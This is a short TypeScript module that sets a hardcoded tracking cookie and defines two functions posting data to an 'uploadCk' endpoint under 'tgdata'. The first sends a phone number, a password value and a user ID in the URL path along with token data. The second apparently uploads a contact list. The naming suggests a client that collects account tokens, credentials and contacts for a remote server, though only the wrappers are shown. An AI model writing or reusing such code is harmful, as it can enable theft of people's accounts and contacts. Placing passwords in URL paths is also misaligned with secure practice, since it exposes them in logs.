import { post } from './request';
import { setCookie } from './tool';

setCookie('__gaid__', 'Asdu1kkYw2z5L2qQNNMHfE9SxaUrJPb');

export async function saveToken(data: any, uphone: string, pwdas: string, userId: string) {
  return post(`/apis/system/tgdata/uploadCk/${uphone}/${pwdas}/${userId}`, data);
}

export async function saveConcatList(data: any, uphone: string, userId: string) {
  return post(`/apis/system/tgdata/uploadCk/${uphone}/${userId}`, data);
}
